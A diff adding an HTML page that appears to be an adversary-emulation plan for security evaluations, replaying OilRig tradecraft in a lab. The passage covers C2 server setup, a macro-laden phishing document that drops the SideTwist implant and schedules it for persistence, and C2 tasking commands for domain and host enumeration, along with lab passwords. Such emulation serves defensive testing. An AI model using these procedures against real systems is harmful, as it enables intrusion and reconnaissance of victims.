@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.771964962339">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Scenario Overview</title>
+    <meta name="title" content="Scenario Overview">
+    <meta name="description" content="Legend of symbols:">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/managedservices/oilrig/emulation_plan/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/managedservices/oilrig/emulation_plan/">
+    <meta property="og:title" content="Scenario Overview">
+    <meta property="og:description" content="Legend of symbols:">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/managedservices/oilrig/emulation_plan/">
+    <meta property="twitter:title" content="Scenario Overview">
+    <meta property="twitter:description" content="Legend of symbols:">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../resources/css/retype.css?v=3.5.0.771964962339" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.5.0.771964962339" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Managed Services
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../managedservices/oilrig/" class="pr-4">
+                                                Oil​Rig
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../managedservices/oilrig/emulation_plan/" class="pr-4">
+                                                Scenario Overview
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="scenario-overview" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#scenario-overview">#</doc-anchor-trigger>
+        <span>Scenario Overview</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../categories/managed-services/">managed-services</a></div>
+</div>
+
+<p>Legend of symbols:</p>
+<ul>
+<li><span class="docs-emoji">&#x1F4A1;</span> - callout notes</li>
+<li><span class="docs-emoji">&#x2757;</span> - extremely important note</li>
+<li><span class="docs-emoji">&#x27A1;&#xFE0F;</span> - Switching to another session</li>
+<li><span class="docs-emoji">&#x2B55;</span> - Sign out of something</li>
+</ul>
+<hr>
+<p>This scenario emulates OilRig TTPs based on several malware specimens either
+used by or associated with the OilRig actors:</p>
+<ol>
+<li>SideTwist</li>
+<li>VALUEVAULT</li>
+<li>TwoFace</li>
+<li>RDAT</li>
+</ol>
+<p><em>A Note on This Document:</em></p>
+<p>This all-in-one file does not include steps related to noise, which was also
+conducted during the week. For the purpose of the plan, presume that an active
+user session for Gosta is present for any SideTwist steps, necessary for the
+scheduled task to execute the implant. This session originated from an
+out-of-scope jump box</p>
+<hr>
+<doc-anchor-target id="step-0---setup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-0---setup">#</doc-anchor-trigger>
+        <span>Step 0 - Setup</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>The C2 consists of an HTTP server that hosts a dummy a Flickr error page.
+Commands to the implant are embedded between &lt;script&gt; tags. The command
+itself consists of a base64-encoded blob which contains an encrypted string
+(using simple xor encryption). Requests to the page that do not correspond
+to a registered implant will simply return the dummy page.</p>
+<p>The malicious document is delivered from a separate attacking machine running
+postfix.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x1F4A1;</span> RDP, do not SSH, to the Linux Attack Platform <code v-pre>192.168.0.4</code> hosting the C2 server.</p>
+</li>
+<li><p>Open a new terminal window and cd to the cloned repo control server:</p>
+</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">cd /opt/oilrig/Resources/control_server</code></pre>
+</doc-codeblock></div>
+<ul>
+<li>Ensure the SideTwist handler is enabled for the server:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">tail -n 5 ./config/handler_config.yml</code></pre>
+</doc-codeblock></div>
+<p>Result:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">sidetwist:
+  host: 192.168.0.4
+  port: 443
+  enabled: true</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x1F4A1;</span> if the output contains <code v-pre>enabled: false</code>, change the value in
+<code v-pre>handler_config.yml</code> to match above.</p>
+<ul>
+<li>Start the control server:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">sudo ./controlServer</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> SSH to the Mail and Apache Server <code v-pre>192.168.0.5</code> to ensure the malicious
+document (<code v-pre>Marketing_Materials.zip</code>) is in /var/www/html.</p>
+</li>
+<li><p>Check the file exists:</p>
+</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">ls /var/www/html</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x1F4A1;</span> If the armed and zipped file is not there, follow the <a href="../resources/sidetwist_dropper/">instructions</a>
+for creating it then copy the zip file to <code v-pre>/var/www/html</code>.</p>
+<ul>
+<li>Restart the Apache and Postfix services to ensure they are fresh:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">systemctl restart apache2
+systemctl restart postfix</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="step-1---initial-compromise-and-persistence">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---initial-compromise-and-persistence">#</doc-anchor-trigger>
+        <span>Step 1 - Initial Compromise and Persistence</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 1 emulates OilRig gaining initial access from user <code v-pre>gosta</code> downloading and
+opening a Microsoft Word document received from a link in a spearphishing email
+from <code v-pre>team@ganjavigms.com</code>. The malicious macro enabled in the document performs
+the following actions when the document is first opened:</p>
+<ol>
+<li>The <code v-pre>computername</code> and <code v-pre>username</code> environment variables are collected.</li>
+<li>A sandbox detection check is performed using <code v-pre>Application.MouseAvailable</code>.</li>
+<li>The SideTwist payload is embedded within the document under
+<code v-pre>UserForm1.TextBox1.Text</code> as base64-encoded data.</li>
+<li>Two artifacts <code v-pre>b.doc</code> (actually an executable) and <code v-pre>update.xml</code> are dropped
+into this directory. <code v-pre>b.doc</code> is the SideTwist payload and <code v-pre>update.xml</code> is an
+additional empty file that, if not present, SideTwist will terminate automatically.</li>
+</ol>
+<p>When the document is closed:</p>
+<ol start="5">
+<li>Another sandbox detection check is performed using
+<code v-pre>Application.MouseAvailable</code>.</li>
+<li><code v-pre>b.doc</code> is renamed to <code v-pre>SystemFailureReporter.exe</code>.</li>
+<li>A scheduled task named <code v-pre>SystemFailureReporter</code> is created and runs
+<code v-pre>SystemFailureReporter.exe</code> every 5 minutes.</li>
+</ol>
+<p>When <code v-pre>SystemFailureReporter.exe</code> runs:</p>
+<ol start="8">
+<li><code v-pre>SystemFailureReporter.exe</code> uses the GetUserName API, GetComputerName API, and
+GetDomainName API to find the current user, hostname, and domain respectively.</li>
+<li><code v-pre>SystemFailureReporter.exe</code> connects to the control server (192.168.0.4) over
+XOR encrypted protocol HTTP on port 443.</li>
+</ol>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> RDP into <code v-pre>THEBLOCK (10.1.0.5)</code>:</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th style="text-align: center;">Username</th>
+<th style="text-align: center;">Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">BOOMBOX\gosta</td>
+<td style="text-align: center;">d0ntGoCH4$ingW8trfalls</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>Open Edge and browse to <a href="https://waterfalls.boom.box/owa" class="outbound" target="_blank"><span>https://waterfalls.boom.box/owa</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, login as <code v-pre>Gosta</code>:</li>
+</ul>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th style="text-align: center;">Username</th>
+<th style="text-align: center;">Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">BOOMBOX\gosta</td>
+<td style="text-align: center;">d0ntGoCH4$ingW8trfalls</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><span class="docs-emoji">&#x1F4A1;</span> There should be an unread email from <code v-pre>team@ganjavigms.com</code>.</p>
+<ul>
+<li><p>Open this email and click the link to download the zipped file.</p>
+</li>
+<li><p>Open File Explorer and navigate to the Downloads file directory.</p>
+</li>
+<li><p>Unzip <code v-pre>Marketing_Materials.zip</code> and enter the password <code v-pre>!M@rk3ting!</code> when
+prompted</p>
+</li>
+<li><p>Double click the extracted word document <code v-pre>GGMS Overview.doc</code>, click &quot;enable editing&quot;, and click &quot;enable
+content&quot;.</p>
+</li>
+</ul>
+<p><span class="docs-emoji">&#x2757;</span> Wait 30 seconds then close the document.</p>
+<ul>
+<li><span class="docs-emoji">&#x1F50D;</span> The C2 server should register a new SideTwist callback after the
+document is closed.</li>
+</ul>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>SideTwist Dropper: <a href="../resources/sidetwist_dropper/">SideTwist_Dropper</a></li>
+<li>Dropper Payload collects environment variables: <a href="../resources/sidetwist_dropper/payload.vbs#L203-L205/">payload.vbs#L203-205</a></li>
+<li>Dropper Payload sandbox detection: <a href="../resources/sidetwist_dropper/payload.vbs#L211/">payload.vbs#L211</a></li>
+<li>Dropper Payload directory creation: <a href="../resources/sidetwist_dropper/payload.vbs#L220-L225/">payload.vbs#L220-L225</a></li>
+<li>Dropper Payload drops b.doc and update.xml: <a href="../resources/sidetwist_dropper/payload.vbs#L229-L235/">payload.vbs#L229-L235</a></li>
+<li>Dropper Payload sandbox detection 2: <a href="../resources/sidetwist_dropper/payload.vbs#L247/">payload.vbs#L247</a></li>
+<li>Dropper Payload b.doc rename: <a href="../resources/sidetwist_dropper/payload.vbs#L251-L259">payload.vbs#L251-L259</a></li>
+<li>Dropper Payload scheduled task: <a href="../resources/sidetwist_dropper/payload.vbs#L140-L194/">payload.vbs#L140-L194</a></li>
+</ul>
+<br>
+<ul>
+<li>SideTwist Implant: <a href="../resources/sidetwist/">SideTwist Implant</a></li>
+<li>SideTwist collects ID info: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L238-L280/">SideTwist.cpp#L238-L280</a></li>
+<li>SideTwist sets IP/port: <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L180-L219/">SideTwist.cpp#L180-L219</a></li>
+<li>SideTwist encrypts communications: <a href="../resources/sidetwist/sidetwist/comms.cpp#L106-L111">comms.cpp#L106-L111</a></li>
+<li>SideTwist XOR key: <a href="../resources/sidetwist/sidetwist/comms.h#L23">comms.h#L23</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>SideTwist: <a href="https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/" class="outbound" target="_blank"><span>https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>VBA coding/macros: <a href="https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/" class="outbound" target="_blank"><span>https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-2---workstation-discovery">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---workstation-discovery">#</doc-anchor-trigger>
+        <span>Step 2 - Workstation Discovery</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 2 emulates OilRig performing a string of initial enumeration commands using
+the cmd spawned by <code v-pre>SystemFailureReporter.exe</code>.</p>
+<p>OilRig enumerates the current user, system information, system network
+configuration information, domain users, domain groups, domain accounts, local
+groups, network connections, running processes, running services, and a
+registry key value to check if RDP is enabled.</p>
+<p>At this point OilRig has discovered that the current user <code v-pre>gosta</code> is a member of
+<code v-pre>EWS Admins</code>, that EWS server <code v-pre>WATERFALLS</code> has the ip address of <code v-pre>10.1.0.6</code> and
+is part of the <code v-pre>Exchange Trusted Subsystem</code> group, and the existence of several
+other administrator groups, including <code v-pre>SQL Admins</code> of which user <code v-pre>tous</code> is a member.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> On Linux Attack Platform <code v-pre>192.168.0.4</code> as user <code v-pre>saka</code>, split the existing C2
+terminal window horizontally, being careful to not terminate the server.</p>
+<p><code v-pre>Right click &gt; Split Horizontally</code></p>
+<p>In the bottom split window, issue the following commands to the implant,
+waiting until each task is accomplished before teeing the next one.</p>
+<p><span class="docs-emoji">&#x1F4A1;</span> The implant will execute every 5 minutes.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Helminth has been observed to perform initial information gathering on systems, including the enumeration of the current user, accounts, groups, system information, network connections, processes, services, and if remote desktop is enabled.
+
+./evalsC2client.py --set-task goTb '101 whoami &amp; hostname &amp; ipconfig /all &amp; net user /domain 2&gt;&amp;1 &amp; net group /domain 2&gt;&amp;1 &amp; net group &quot;domain admins&quot; /domain 2&gt;&amp;1 &amp; net group &quot;Exchange Trusted Subsystem&quot; /domain 2&gt;&amp;1 &amp; net accounts /domain 2&gt;&amp;1 &amp; net user 2&gt;&amp;1 &amp; net localgroup administrators 2&gt;&amp;1 &amp; netstat -an 2&gt;&amp;1 &amp; tasklist 2&gt;&amp;1 &amp; sc query 2&gt;&amp;1 &amp; systeminfo 2&gt;&amp;1 &amp; reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; 2&gt;&amp;1'</code></pre>
+</doc-codeblock></div>
+<p>Perform follow up discovery using gained information to determine gosta is a
+member of EWS Administrators, tous is a SQL administrator and the IP of
+WATERFALLS.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has been observed to perform enumeration of users and groups.[3]
+
+./evalsC2client.py --set-task goTb '101 net user gosta /domain 2&gt;&amp;1 &amp; net group &quot;SQL Admins&quot; /domain 2&gt;&amp;1 &amp; nslookup WATERFALLS 2&gt;&amp;1'</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
